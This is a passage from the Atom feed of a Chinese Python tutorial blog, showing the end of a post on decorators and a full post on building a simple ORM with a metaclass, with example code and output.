foo</span></div></pre></td></tr></table></figure></p>
<p>@@log(‘SHUN_TAG’)实际上会执行如下语句：<br><code>foo = log(&#39;SHUN_TAG&#39;)(foo)</code><br>然后<strong>最终会返回wrapper函数给foo</strong>，另外要记得<code>wrapper.__name__ = func.__name__</code>，防止有些函数签名的代码回报错。</p>
<p>也可以用@functools.wraps(func)来代替上述写法：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> functools</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(text)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorator</span><span class="params">(func)</span>:</span></div><div class="line"><span class="meta">        @functools.wraps(func)</span></div><div class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kw)</span>:</span></div><div class="line">            print(<span class="string">'%s, start %s()'</span> % (text, func.__name__))</div><div class="line">            func(*args, **kw)</div><div class="line">            print(<span class="string">'%s, end %s()'</span> % (text, func.__name__))</div><div class="line">        <span class="keyword">return</span> wrapper</div><div class="line">    <span class="keyword">return</span> decorator</div></pre></td></tr></table></figure></p>
<p>其实也没有什么复杂的东西。</p>
<h1 id="五、class式的-Decorator"><a href="#五、class式的-Decorator" class="headerlink" title="五、class式的 Decorator"></a>五、class式的 Decorator</h1><p>最后再来看下decorator的class方式，还是看个示例：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">myDecorator</span><span class="params">(object)</span>:</span></div><div class="line"> </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, fn)</span>:</span></div><div class="line">        <span class="keyword">print</span> <span class="string">"inside myDecorator.__init__()"</span></div><div class="line">        self.fn = fn</div><div class="line"> </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self)</span>:</span></div><div class="line">        self.fn()</div><div class="line">        <span class="keyword">print</span> <span class="string">"inside myDecorator.__call__()"</span></div><div class="line"> </div><div class="line"><span class="meta">@myDecorator</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">aFunction</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"inside aFunction()"</span></div><div class="line"> </div><div class="line"><span class="keyword">print</span> <span class="string">"Finished decorating aFunction()"</span></div><div class="line"> </div><div class="line">aFunction()</div><div class="line"> </div><div class="line"><span class="comment"># 输出：</span></div><div class="line"><span class="comment"># inside myDecorator.__init__()</span></div><div class="line"><span class="comment"># Finished decorating aFunction()</span></div><div class="line"><span class="comment"># inside aFunction()</span></div><div class="line"><span class="comment"># inside myDecorator.__call__()</span></div></pre></td></tr></table></figure></p>
<p>用类的方式声明一个decorator。我们可以看到这个类中有两个成员：</p>
<ul>
<li>一个是<strong>init</strong>()，这个方法是在我们给某个函数decorator时被调用，所以，需要有一个fn的参数，也就是被decorator的函数。</li>
<li>一个是<strong>call</strong>()，这个方法是在我们调用被decorator函数时被调用的。<br>上面输出可以看到整个程序的执行顺序。</li>
</ul>
<h1 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h1><p>decorator可以增强函数的功能，定义起来虽然有点复杂，但使用起来非常灵活和方便。</p>
<p>References:</p>
<ul>
<li><a href="http://coolshell.cn/articles/11265.html" target="_blank" rel="external">Python修饰器的函数式编程</a></li>
<li><a href="http://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/0014318435599930270c0381a3b44db991cd6d858064ac0000" target="_blank" rel="external">廖雪峰的教程</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2分钟告诉你什么是python装饰器。&lt;/p&gt;
    
    </summary>
    
      <category term="Python基础" scheme="https://maoao530.github.io/categories/Python%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="python" scheme="https://maoao530.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>如何构建一个orm框架？</title>
    <link href="https://maoao530.github.io/2016/04/25/python-orm/"/>
    <id>https://maoao530.github.io/2016/04/25/python-orm/</id>
    <published>2016-04-25T15:54:48.000Z</published>
    <updated>2017-01-31T07:16:59.035Z</updated>
    
    <content type="html"><![CDATA[<p>ORM全称“Object Relational Mapping”，即对象-关系映射，就是把关系数据库的一行映射为一个对象，也就是一个类对应一个表，这样，写代码更简单，不用直接操作SQL语句。</p>
<a id="more"></a>
<h1 id="一、预备知识"><a href="#一、预备知识" class="headerlink" title="一、预备知识"></a>一、预备知识</h1><p>开始之前，请先掌握python metaclass的知识，请参考我的文章：<a href="https://maoao530.github.io/2016/04/12/python-metaclass/">从Python Metaclass说起</a>  </p>
<p>为什么要使用metaclass？因为要编写一个ORM框架，所有的类都只能动态定义，只有使用者才能根据表的结构定义出对应的类来。</p>
<p>掌握了元类的知识后，我们来尝试编写一个ORM框架。首先，假设我们有一个User表，那么我们可能会写出如下代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(Model)</span>:</span></div><div class="line">    <span class="comment"># 定义类的属性到列的映射：</span></div><div class="line">    id = IntegerField(<span class="string">'id'</span>)</div><div class="line">    name = StringField(<span class="string">'username'</span>)</div><div class="line">    email = StringField(<span class="string">'email'</span>)</div><div class="line">    password = StringField(<span class="string">'password'</span>)</div><div class="line"></div><div class="line"><span class="comment"># 创建一个实例：</span></div><div class="line">u = User(id=<span class="number">12345</span>, name=<span class="string">'Michael'</span>, email=<span class="string">'test@orm.org'</span>, password=<span class="string">'my-pwd'</span>)</div><div class="line"><span class="comment"># 保存到数据库：</span></div><div class="line">u.save()</div></pre></td></tr></table></figure></p>
<p>怎么样？我们可以不用直接去操作SQL了，看上去是不是非常简单呢？</p>
<h1 id="二、设计Field类"><a href="#二、设计Field类" class="headerlink" title="二、设计Field类"></a>二、设计Field类</h1><p>接下来我们要定义Field类，它负责保存数据库表的<strong>字段名</strong>和<strong>字段类型</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Field</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, column_type)</span>:</span></div><div class="line">        self.name = name</div><div class="line">        self.column_type = column_type</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> <span class="string">'&lt;%s:%s&gt;'</span> % (self.__class__.__name__, self.name)</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">StringField</span><span class="params">(Field)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name)</span>:</span></div><div class="line">        super(StringField, self).__init__(name, <span class="string">'varchar(100)'</span>)</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">IntegerField</span><span class="params">(Field)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name)</span>:</span></div><div class="line">        super(IntegerField, self).__init__(name, <span class="string">'bigint'</span>)</div></pre></td></tr></table></figure>
<h1 id="三、设计Model类"><a href="#三、设计Model类" class="headerlink" title="三、设计Model类"></a>三、设计Model类</h1><p>Model类是数据库表类的基类。</p>
<p>在Model类中，就可以定义各种操作数据库的方法，比如save()，delete()，find()，update等等：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 创建Model类时，指定通过ModelMetaclass来创建</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Model</span><span class="params">(dict, metaclass=ModelMetaclass)</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, **kw)</span>:</span></div><div class="line">        print(<span class="string">"Model __init__ : "</span>, kw )</div><div class="line">        super(Model, self).__init__(**kw)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span><span class="params">(self, key)</span>:</span></div><div class="line">        print(<span class="string">"__getattr__: %s &gt; %s"</span> % (key,self[key]))</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            <span class="keyword">return</span> self[key]</div><div class="line">        <span class="keyword">except</span> KeyError:</div><div class="line">            <span class="keyword">raise</span> AttributeError(<span class="string">r"'Model' object has no attribute '%s'"</span> % key)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setattr__</span><span class="params">(self, key, value)</span>:</span></div><div class="line">        print(<span class="string">"__setattr__ : "</span>, key)</div><div class="line">        self[key] = value</div><div class="line"></div><div class="line">    <span class="comment">#只是模拟打印出sql语句</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save</span><span class="params">(self)</span>:</span></div><div class="line">        fields = []</div><div class="line">        params = []</div><div class="line">        args = []</div><div class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> self.__mappings__.items():</div><div class="line">            fields.append(v.name)  <span class="comment"># id,username,email,password 字段名</span></div><div class="line">            params.append(<span class="string">'?'</span>)     <span class="comment"># ????</span></div><div class="line">            args.append(getattr(self, k, <span class="keyword">None</span>))</div><div class="line">        sql = <span class="string">'insert into %s (%s) values (%s)'</span> % (self.__table__, <span class="string">','</span>.join(fields), <span class="string">','</span>.join(params))</div><div class="line">        print(<span class="string">'SQL: %s'</span> % sql)</div><div class="line">        print(<span class="string">'ARGS: %s'</span> % str(args))</div></pre></td></tr></table></figure>
<h1 id="四、设计ModelMetaclass元类"><a href="#四、设计ModelMetaclass元类" class="headerlink" title="四、设计ModelMetaclass元类"></a>四、设计ModelMetaclass元类</h1><p>最后就是mnetaclass元类的编写了。</p>
<p>使用Model中定义的metaclass的ModelMetaclass来创建User类，也就是说，<strong>metaclass可以隐式地继承到子类</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ModelMetaclass</span><span class="params">(type)</span>:</span></div><div class="line">    <span class="comment"># 准备创建的类的对象，类名，父类集合，类方法集合</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__new__</span><span class="params">(cls, name, bases, attrs)</span>:</span></div><div class="line">        print(<span class="string">'Found model: %s'</span> % name)</div><div class="line">        <span class="keyword">if</span> name==<span class="string">'Model'</span>:</div><div class="line">            <span class="keyword">return</span> type.__new__(cls, name, bases, attrs)</div><div class="line">        </div><div class="line">        mappings = dict()</div><div class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> attrs.items():</div><div class="line">            <span class="keyword">if</span> isinstance(v, Field):</div><div class="line">                print(<span class="string">'Found mapping: %s ==&gt; %s'</span> % (k, v))</div><div class="line">                mappings[k] = v</div><div class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> mappings.keys():</div><div class="line">            attrs.pop(k)</div><div class="line">        attrs[<span class="string">'__mappings__'</span>] = mappings    <span class="comment"># 保存属性和列的映射关系</span></div><div class="line">        attrs[<span class="string">'__table__'</span>] = name           <span class="comment"># 假设表名和类名一致</span></div><div class="line">        <span class="keyword">return</span> type.__new__(cls, name, bases, attrs)</div></pre></td></tr></table></figure>
<p>至此，核心代码基本上写完了，怎么样？看起来也不是很难。我们来梳理一下：</p>
<ol>
<li>定义一个class User(Model)类</li>
<li>Python解释器通过父类Model的metaclass找到ModelMetaclass类，通过它来创建User</li>
<li>ModelMetaclass保存User类的一些信息，比如表名，字段等</li>
<li>当我们调用save()方法时，会去用到第三步骤保存的信息，构造出SQL语句，将数据保存到数据库中</li>
</ol>
<p>我们编写代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">u = User(id=<span class="number">12345</span>, name=<span class="string">'Michael'</span>, email=<span class="string">'test@orm.org'</span>, password=<span class="string">'my-pwd'</span>)</div><div class="line">u.save()</div></pre></td></tr></table></figure></p>
<p>输出：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Found model: User</div><div class="line">Found mapping: email ==&gt; &lt;StringField:email&gt;</div><div class="line">Found mapping: password ==&gt; &lt;StringField:password&gt;</div><div class="line">Found mapping: id ==&gt; &lt;IntegerField:uid&gt;</div><div class="line">Found mapping: name ==&gt; &lt;StringField:username&gt;</div><div class="line">SQL: insert into User (password,email,username,id) values (?,?,?,?)</div><div class="line">ARGS: ['my-pwd', 'test@orm.org', 'Michael', 12345]</div></pre></td></tr></table></figure></p>
<p>可以看到，save()方法打印出了SQL语句和参数列表，我们可以根据自己的需求，来将此信息存储到数据库中。</p>
<p>References:</p>
<ul>
<li><a href="http://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/0014319106919344c4ef8b1e04c48778bb45796e0335839000" target="_blank" rel="external">廖雪峰的教程</a> </li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ORM全称“Object Relational Mapping”，即对象-关系映射，就是把关系数据库的一行映射为一个对象，也就是一个类对应一个表，这样，写代码更简单，不用直接操作SQL语句。&lt;/p&gt;
    
    </summary>
    
      <category term="Python进阶" scheme="https://maoao530.github.io/categories/Python%E8%BF%9B%E9%98%B6/"/>
    
    
      <category term="Python" scheme="https://maoao530.github.io/tags/Python/"/>
    
  </entry>
  
</feed>
